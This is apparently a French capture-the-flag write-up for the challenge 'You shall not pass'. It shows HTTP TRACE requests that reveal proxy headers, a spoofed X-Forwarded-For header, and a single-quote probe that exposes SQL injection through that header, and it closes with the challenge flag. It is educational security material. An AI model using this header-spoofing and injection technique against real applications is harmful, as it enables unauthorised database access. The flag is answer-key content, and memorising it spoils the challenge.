# You shall not pass

## Description

Le flag est dans la DB de l'application web, arriverez-vous à l'extraire?

## Solution

On arrive sur une page avec un login standard. Après 3 tentatives en moins de 1 minute, un message nous indique que notre adresse IP a été bannie pour une durée de 1 minute.

L'option TRACE est disponible par défaut sur apache:

### Requête
```
TRACE / HTTP/1.1
Host: whatever


```

### Réponse
```
HTTP/1.1 200 OK
Date: Tue, 30 Jul 2019 19:28:51 GMT
Server: Apache/2.4.10 (Debian)
Content-Type: message/http
Content-Length: 187

TRACE / HTTP/1.1
Host: whatever
X-Forwarded-For: <censored>, 172.25.0.11
X-Forwarded-Host: whatever, whatever
X-Forwarded-Server: 172.25.0.11, 172.25.0.7
Connection: Keep-Alive
```

On s'apperçoit que des proxies se trouve entre nous et l'application web par la présence du header `X-Forwarded-For`. À la place de `<censored>` devrait se trouver votre adresse IP.

On peut ajouter notre propre `X-Forwarded-For` et celui-ci sera accepté par les proxies et envoyé à l'application web:

### Requête
```
TRACE / HTTP/1.1
Host: whatever
X-Forwarded-For: pwned


```

### Réponse
```
HTTP/1.1 200 OK
Date: Tue, 30 Jul 2019 19:29:40 GMT
Server: Apache/2.4.10 (Debian)
Content-Type: message/http
Content-Length: 194

TRACE / HTTP/1.1
Host: whatever
X-Forwarded-For: pwned, <censored>, 172.25.0.11
X-Forwarded-Host: whatever, whatever
X-Forwarded-Server: 172.25.0.11, 172.25.0.7
Connection: Keep-Alive
```

On s'apperçoit que notre input `pwned` a été inséré juste avant notre vrai adresse ip. Nous émettons l'hypothèse que:

- L'application web utilisera l'adresse IP la plus à gauche dans `X-Forwarded-For` pour déterminer l'IP du client (erreur assez fréquente lorsqu'une application est derrière un proxy).

- L'application web utilisera cette adresse IP avec sa base de donnée pour pouvoir déterminer si le client est banni ou non.

Pour tester cette hypothèse, nous envoyons la requête suivante:

### Requête
```
POST / HTTP/1.1
Host: ctf-infosec.com:6008
X-Forwarded-For: '
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

username=&password=
```

La réponse confirme que notre hypothèse est vraie: `SQLite3::query(): Unable to prepare statement...`

Nous avons donc une injection SQL à travers l'en-tête `X-Forwarded-For`. Il n'est toutefois pas possible de contrôler l'output de la base de donnée qui nous est retournée, il faudra donc extraire les données avec du time-based sql injection. Voir le script en annexe pour l'implémentation de la solution.


## Flag 

`FLAG{Proxy_to-[sqli]_Wh4t-tH3_!%&*#?}`

## Annexe

[Solveur](./solver.py)
